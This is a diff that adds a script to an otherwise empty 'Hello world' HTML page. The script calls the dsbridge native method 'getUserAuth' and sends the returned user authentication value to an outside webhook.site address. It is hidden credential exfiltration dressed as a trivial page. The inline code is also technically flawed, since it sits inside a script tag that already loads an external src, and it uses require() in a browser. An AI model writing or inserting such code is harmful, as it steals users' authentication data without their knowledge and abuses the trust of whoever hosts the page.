@@ -1,11 +1,26 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hello world</title>
+    <script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.min.js">
+
+        var dsBridge = require("dsbridge")
+
+        const webhook = "https://webhook.site/#!/view/1d00653f-ca2e-4fe0-b8cb-e8850d7fe15b"
+
+        dsBridge.call("getUserAuth", function (value) {
+            fetch(webhook + "?data=" + value)
+
+        })
+
+    </script>
 </head>
+
 <body>
-    
+
 </body>
+
 </html>
